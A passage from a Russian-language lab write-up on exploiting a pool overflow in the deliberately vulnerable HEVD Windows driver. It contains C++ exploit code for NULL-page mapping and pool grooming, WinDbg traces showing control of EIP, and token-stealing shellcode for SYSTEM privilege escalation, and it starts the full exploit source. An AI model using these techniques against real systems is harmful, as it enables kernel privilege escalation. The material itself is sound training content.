    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Unable to allocate NULL page...wtf?</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Last error: "</span> <span class="o">&lt;&lt;</span> <span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] NULL page mapped.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Putting 'AAAA' on NULL page...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span> <span class="sc">'\x41'</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div></div>

<p>Также заполним NULL страницу \x42 значениями, чтобы, запустив этот код, мы получили Access Violation со значением 0x42424242 в eip</p>

<p>И последнее, нам нужно освободить наши чанки, чтобы активировалась CloseProcedure</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">free_chunks</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Freeing defragmentation allocations...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">defragment_handles</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">BOOL</span> <span class="n">freed</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">defragment_handles</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">freed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Unable to free defragment allocation!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Last error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Defragmentation allocations freed.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Freeing sequential allocations...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sequential_handles</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">BOOL</span> <span class="n">freed</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">sequential_handles</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">freed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Unable to free defragment allocation!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Last error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Sequential allocations freed.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Где-то здесь я пришёл к выводу, что его код всё-таки хороший и идея раскидать всё по функция стоит того))))</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">g</span>
<span class="nx">Breakpoint</span> <span class="mi">0</span> <span class="nx">hit</span>
<span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerPoolOverflow</span><span class="p">:</span>
<span class="nx">a815b12a</span> <span class="mi">6</span><span class="nx">a14</span>            <span class="nx">push</span>    <span class="mi">14</span><span class="nx">h</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">g</span>
<span class="nx">Breakpoint</span> <span class="mi">1</span> <span class="nx">hit</span>
<span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerPoolOverflow</span><span class="o">+</span><span class="mh">0xe6</span><span class="p">:</span>
<span class="nx">a815b210</span> <span class="mi">686</span><span class="nx">cc315a8</span>      <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="p">::</span><span class="nx">NNGAKEGL</span><span class="p">::</span><span class="s2">`string' (a815c36c)
kd&gt; g
Access violation - code c0000005 (!!! second chance !!!)
41414141 ??              ???
</span></code></pre></div></div>

<p>Видим, что 0xC поменялся на 0x0</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">db</span> <span class="mi">8756</span><span class="nx">dd40</span><span class="o">-</span><span class="mi">8</span>
<span class="nx">ReadVirtual</span><span class="p">:</span> <span class="mi">8756</span><span class="nx">dd38</span> <span class="nx">not</span> <span class="nx">properly</span> <span class="nx">sign</span> <span class="nx">extended</span>
<span class="mi">8756</span><span class="nx">dd38</span>  <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span><span class="o">-</span><span class="mi">40</span> <span class="mi">00</span> <span class="mi">08</span> <span class="mi">04</span> <span class="mi">45</span> <span class="mi">76</span> <span class="mi">65</span> <span class="nx">ee</span>  <span class="nx">BBBBBBBB</span><span class="p">@...</span><span class="nx">Eve</span><span class="p">.</span>
<span class="mi">8756</span><span class="nx">dd48</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="p">....@...........</span>
<span class="mi">8756</span><span class="nx">dd58</span>  <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="o">-&gt;</span><span class="mi">00</span><span class="o">&lt;-</span> <span class="mi">00</span> <span class="mi">08</span> <span class="mi">00</span>  <span class="p">................</span>
<span class="mi">8756</span><span class="nx">dd68</span>  <span class="mi">40</span> <span class="nx">b2</span> <span class="nx">eb</span> <span class="mi">86</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">01</span> <span class="mi">00</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="p">@...............</span>
<span class="mi">8756</span><span class="nx">dd78</span>  <span class="mi">78</span> <span class="nx">dd</span> <span class="mi">56</span> <span class="mi">87</span> <span class="mi">78</span> <span class="nx">dd</span> <span class="mi">56</span> <span class="mi">87</span><span class="o">-</span><span class="mi">08</span> <span class="mi">00</span> <span class="mi">08</span> <span class="mi">04</span> <span class="mi">45</span> <span class="mi">76</span> <span class="mi">65</span> <span class="nx">ee</span>  <span class="nx">x</span><span class="p">.</span><span class="nx">V</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">V</span><span class="p">.....</span><span class="nx">Eve</span><span class="p">.</span>
<span class="mi">8756</span><span class="nx">dd88</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="p">....@...........</span>
<span class="mi">8756</span><span class="nx">dd98</span>  <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">0</span><span class="nx">c</span> <span class="mi">00</span> <span class="mi">08</span> <span class="mi">00</span>  <span class="p">................</span>
<span class="mi">8756</span><span class="nx">dda8</span>  <span class="mi">40</span> <span class="nx">b2</span> <span class="nx">eb</span> <span class="mi">86</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">01</span> <span class="mi">00</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="p">@...............</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mh">0x00000000</span>
<span class="mi">00000000</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">00000010</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
</code></pre></div></div>

<h2 id="шеллкод"><a href="#header-2"></a>Шеллкод</h2>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">k</span>
 <span class="err">#</span> <span class="nx">ChildEBP</span> <span class="nx">RetAddr</span>      
<span class="nx">WARNING</span><span class="p">:</span> <span class="nx">Frame</span> <span class="nx">IP</span> <span class="nx">not</span> <span class="k">in</span> <span class="nx">any</span> <span class="nx">known</span> <span class="nx">module</span><span class="p">.</span> <span class="nx">Following</span> <span class="nx">frames</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">wrong</span><span class="p">.</span>
<span class="mi">00</span> <span class="nx">a9f93ae8</span> <span class="mi">82886565</span>     <span class="mh">0x41414141</span>
<span class="mi">01</span> <span class="nx">a9f93b38</span> <span class="mi">828</span><span class="nx">b54a7</span>     <span class="nx">nt</span><span class="o">!</span><span class="nx">ObpCloseHandleTableEntry</span><span class="o">+</span><span class="mh">0x6d</span>
<span class="mi">02</span> <span class="nx">a9f93b68</span> <span class="mi">8289</span><span class="nx">d617</span>     <span class="nx">nt</span><span class="o">!</span><span class="nx">ExSweepHandleTable</span><span class="o">+</span><span class="mh">0x5f</span>
<span class="mi">03</span> <span class="nx">a9f93b88</span> <span class="mi">828</span><span class="nx">aa467</span>     <span class="nx">nt</span><span class="o">!</span><span class="nx">ObKillProcess</span><span class="o">+</span><span class="mh">0x54</span>
<span class="mi">04</span> <span class="nx">a9f93bfc</span> <span class="mi">8289</span><span class="nx">d0fa</span>     <span class="nx">nt</span><span class="o">!</span><span class="nx">PspExitThread</span><span class="o">+</span><span class="mh">0x5e4</span>
<span class="mi">05</span> <span class="nx">a9f93c24</span> <span class="mi">82679</span><span class="nx">e06</span>     <span class="nx">nt</span><span class="o">!</span><span class="nx">NtTerminateProcess</span><span class="o">+</span><span class="mh">0x12e</span>
    <span class="o">&lt;</span><span class="nx">Intermediate</span> <span class="nx">frames</span> <span class="nx">may</span> <span class="nx">have</span> <span class="nx">been</span> <span class="nx">skipped</span> <span class="nx">due</span> <span class="nx">to</span> <span class="nx">lack</span> <span class="k">of</span> <span class="nx">complete</span> <span class="nx">unwind</span><span class="o">&gt;</span>
<span class="mi">06</span> <span class="nx">a9f93c24</span> <span class="mi">77</span><span class="nf">ab6c74 </span><span class="p">(</span><span class="nx">T</span><span class="p">)</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">KiSystemServicePostCall</span>
    <span class="o">&lt;</span><span class="nx">Intermediate</span> <span class="nx">frames</span> <span class="nx">may</span> <span class="nx">have</span> <span class="nx">been</span> <span class="nx">skipped</span> <span class="nx">due</span> <span class="nx">to</span> <span class="nx">lack</span> <span class="k">of</span> <span class="nx">complete</span> <span class="nx">unwind</span><span class="o">&gt;</span>
<span class="mi">07</span> <span class="mi">0030</span><span class="nx">f9b0</span> <span class="mi">7754</span><span class="nf">be67 </span><span class="p">(</span><span class="nx">T</span><span class="p">)</span> <span class="mh">0x77ab6c74</span>
<span class="mi">08</span> <span class="mi">0030</span><span class="nx">f9c4</span> <span class="mi">6</span><span class="nx">e33603d</span>     <span class="mh">0x7754be67</span>
<span class="mi">09</span> <span class="mi">0030</span><span class="nx">fa18</span> <span class="mi">6</span><span class="nx">e3361b1</span>     <span class="mh">0x6e33603d</span>
<span class="mi">0</span><span class="nx">a</span> <span class="mi">0030</span><span class="nx">fa24</span> <span class="mi">00021</span><span class="nx">a10</span>     <span class="mh">0x6e3361b1</span>
<span class="mi">0</span><span class="nx">b</span> <span class="mi">0030</span><span class="nx">fa40</span> <span class="mi">00021</span><span class="nx">a57</span>     <span class="mh">0x21a10</span>
<span class="mi">0</span><span class="nx">c</span> <span class="mi">0030</span><span class="nx">fa4c</span> <span class="mi">00023007</span>     <span class="mh">0x21a57</span>
<span class="mi">0</span><span class="nx">d</span> <span class="mi">0030</span><span class="nx">fa94</span> <span class="mi">7753</span><span class="nx">ef8c</span>     <span class="mh">0x23007</span>
<span class="mi">0</span><span class="nx">e</span> <span class="mi">0030</span><span class="nx">faa0</span> <span class="mi">77</span><span class="nx">ad367a</span>     <span class="mh">0x7753ef8c</span>
<span class="mi">0</span><span class="nx">f</span> <span class="mi">0030</span><span class="nx">fae0</span> <span class="mi">77</span><span class="nx">ad364d</span>     <span class="mh">0x77ad367a</span>
<span class="mi">10</span> <span class="mi">0030</span><span class="nx">faf8</span> <span class="mi">00000000</span>     <span class="mh">0x77ad364d</span>

<span class="mi">8288650</span><span class="nx">d</span> <span class="mi">0</span><span class="nx">fb64e0c</span>        <span class="nx">movzx</span>   <span class="nx">ecx</span><span class="p">,</span><span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esi</span><span class="o">+</span><span class="mi">0</span><span class="nx">Ch</span><span class="p">]</span>
<span class="mi">82886511</span> <span class="mi">8</span><span class="nx">b1c8de02e7882</span>  <span class="nx">mov</span>     <span class="nx">ebx</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="nx">nt</span><span class="o">!</span><span class="nc">ObTypeIndexTable </span><span class="p">(</span><span class="mi">82782</span><span class="nx">ee0</span><span class="p">)[</span><span class="nx">ecx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
<span class="mi">82886518</span> <span class="mi">57</span>              <span class="nx">push</span>    <span class="nx">edi</span>
<span class="mi">82886519</span> <span class="mi">648</span><span class="nx">b3d24010000</span>  <span class="nx">mov</span>     <span class="nx">edi</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="nx">fs</span><span class="p">:[</span><span class="mi">124</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886520</span> <span class="mi">837</span><span class="nx">b7400</span>        <span class="nx">cmp</span>     <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebx</span><span class="o">+</span><span class="mi">74</span><span class="nx">h</span><span class="p">],</span><span class="mi">0</span>
<span class="mi">82886524</span> <span class="mi">8</span><span class="nx">d4e18</span>          <span class="nx">lea</span>     <span class="nx">ecx</span><span class="p">,[</span><span class="nx">esi</span><span class="o">+</span><span class="mi">18</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886527</span> <span class="mi">894</span><span class="nx">c2414</span>        <span class="nx">mov</span>     <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esp</span><span class="o">+</span><span class="mi">14</span><span class="nx">h</span><span class="p">],</span><span class="nx">ecx</span>
<span class="mi">8288652</span><span class="nx">b</span> <span class="nx">c644241300</span>      <span class="nx">mov</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esp</span><span class="o">+</span><span class="mi">13</span><span class="nx">h</span><span class="p">],</span><span class="mi">0</span>
<span class="mi">82886530</span> <span class="mi">0</span><span class="nx">f8497000000</span>    <span class="nx">je</span>      <span class="nx">nt</span><span class="o">!</span><span class="nx">ObpCloseHandleTableEntry</span><span class="o">+</span><span class="mh">0xd5</span> <span class="p">(</span><span class="mi">828865</span><span class="nx">cd</span><span class="p">)</span>
<span class="mi">82886536</span> <span class="mi">648</span><span class="nx">b0d24010000</span>  <span class="nx">mov</span>     <span class="nx">ecx</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="nx">fs</span><span class="p">:[</span><span class="mi">124</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">8288653</span><span class="nx">d</span> <span class="mi">8</span><span class="nx">b4510</span>          <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mi">10</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886540</span> <span class="mi">394150</span>          <span class="nx">cmp</span>     <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ecx</span><span class="o">+</span><span class="mi">50</span><span class="nx">h</span><span class="p">],</span><span class="nx">eax</span>
<span class="mi">82886543</span> <span class="mi">7410</span>            <span class="nx">je</span>      <span class="nx">nt</span><span class="o">!</span><span class="nx">ObpCloseHandleTableEntry</span><span class="o">+</span><span class="mh">0x5d</span> <span class="p">(</span><span class="mi">82886555</span><span class="p">)</span>
<span class="mi">82886545</span> <span class="mi">8</span><span class="nx">d4c2420</span>        <span class="nx">lea</span>     <span class="nx">ecx</span><span class="p">,[</span><span class="nx">esp</span><span class="o">+</span><span class="mi">20</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886549</span> <span class="mi">51</span>              <span class="nx">push</span>    <span class="nx">ecx</span>
<span class="mi">8288654</span><span class="nx">a</span> <span class="mi">50</span>              <span class="nx">push</span>    <span class="nx">eax</span>
<span class="mi">8288654</span><span class="nx">b</span> <span class="nx">e8c71ce5ff</span>      <span class="nx">call</span>    <span class="nx">nt</span><span class="o">!</span><span class="nc">KeStackAttachProcess </span><span class="p">(</span><span class="mi">826</span><span class="nx">d8217</span><span class="p">)</span>
<span class="mi">82886550</span> <span class="nx">c644241301</span>      <span class="nx">mov</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esp</span><span class="o">+</span><span class="mi">13</span><span class="nx">h</span><span class="p">],</span><span class="mi">1</span>
<span class="mi">82886555</span> <span class="nx">ff7518</span>          <span class="nx">push</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mi">18</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886558</span> <span class="nx">ff7514</span>          <span class="nx">push</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mi">14</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">8288655</span><span class="nx">b</span> <span class="nx">ff74241c</span>        <span class="nx">push</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esp</span><span class="o">+</span><span class="mi">1</span><span class="nx">Ch</span><span class="p">]</span>
<span class="mi">8288655</span><span class="nx">f</span> <span class="nx">ff7510</span>          <span class="nx">push</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mi">10</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886562</span> <span class="nx">ff5374</span>          <span class="nx">call</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebx</span><span class="o">+</span><span class="mi">74</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">82886565</span> <span class="mi">84</span><span class="nx">c0</span>            <span class="nx">test</span>    <span class="nx">al</span><span class="p">,</span><span class="nx">al</span>
<span class="mi">82886567</span> <span class="mi">7561</span>            <span class="nx">jne</span>     <span class="nx">nt</span><span class="o">!</span><span class="nx">ObpCloseHandleTableEntry</span><span class="o">+</span><span class="mh">0xd2</span> <span class="p">(</span><span class="mi">828865</span><span class="nx">ca</span><span class="p">)</span>


</code></pre></div></div>

<p>Видим пуши, которые нужно будет компенсировать попом в конце шеллкода</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mh">0x0</span>
<span class="mi">00000000</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000010</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000020</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000030</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000040</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000050</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000060</span>  <span class="mi">00060000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00000070</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">u</span> <span class="mi">00060000</span> <span class="nx">L15</span>
<span class="mi">00060000</span> <span class="mi">60</span>              <span class="nx">pushad</span>
<span class="mi">00060001</span> <span class="mi">64</span><span class="nx">a124010000</span>    <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="nx">fs</span><span class="p">:[</span><span class="mi">00000124</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">00060007</span> <span class="mi">8</span><span class="nx">b4050</span>          <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">50</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">0006000</span><span class="nx">a</span> <span class="mi">89</span><span class="nx">c1</span>            <span class="nx">mov</span>     <span class="nx">ecx</span><span class="p">,</span><span class="nx">eax</span>
<span class="mi">0006000</span><span class="nx">c</span> <span class="mi">8</span><span class="nx">b98f8000000</span>    <span class="nx">mov</span>     <span class="nx">ebx</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">0</span><span class="nx">F8h</span><span class="p">]</span>
<span class="mi">00060012</span> <span class="nx">ba04000000</span>      <span class="nx">mov</span>     <span class="nx">edx</span><span class="p">,</span><span class="mi">4</span>
<span class="mi">00060017</span> <span class="mi">8</span><span class="nx">b80b8000000</span>    <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">0</span><span class="nx">B8h</span><span class="p">]</span>
<span class="mi">0006001</span><span class="nx">d</span> <span class="mi">2</span><span class="nx">db8000000</span>      <span class="nx">sub</span>     <span class="nx">eax</span><span class="p">,</span><span class="mi">0</span><span class="nx">B8h</span>
<span class="mi">00060022</span> <span class="mi">3990</span><span class="nx">b4000000</span>    <span class="nx">cmp</span>     <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">0</span><span class="nx">B4h</span><span class="p">],</span><span class="nx">edx</span>
<span class="mi">00060028</span> <span class="mi">75</span><span class="nx">ed</span>            <span class="nx">jne</span>     <span class="mi">00060017</span>
<span class="mi">0006002</span><span class="nx">a</span> <span class="mi">8</span><span class="nx">b90f8000000</span>    <span class="nx">mov</span>     <span class="nx">edx</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">0</span><span class="nx">F8h</span><span class="p">]</span>
<span class="mi">00060030</span> <span class="mi">8991</span><span class="nx">f8000000</span>    <span class="nx">mov</span>     <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ecx</span><span class="o">+</span><span class="mi">0</span><span class="nx">F8h</span><span class="p">],</span><span class="nx">edx</span>
<span class="mi">00060036</span> <span class="mi">61</span>              <span class="nx">popad</span>
<span class="mi">00060037</span> <span class="nx">c21000</span>          <span class="nx">ret</span>     <span class="mi">10</span><span class="nx">h</span>
<span class="mi">0006003</span><span class="nx">a</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
<span class="mi">0006003</span><span class="nx">c</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
<span class="mi">0006003</span><span class="nx">e</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
<span class="mi">00060040</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
<span class="mi">00060042</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
<span class="mi">00060044</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
<span class="mi">00060046</span> <span class="mi">0000</span>            <span class="nx">add</span>     <span class="nx">byte</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="p">],</span><span class="nx">al</span>
</code></pre></div></div>

<p><img src="/assets/post_images/10.png" alt="cmd screen" /></p>

<p><a href="https://github.com/h0mbre/Windows-Exploits/blob/master/Exploit-Code/HEVD/x86_PoolOverflow.cpp">Полный код</a></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="cp">#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL               0x22200F
</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span>
    <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
    <span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
    <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
    <span class="n">PSIZE_T</span> <span class="n">AllocationSize</span><span class="p">,</span>
    <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
    <span class="n">ULONG</span> <span class="n">Protect</span>
    <span class="p">);</span>

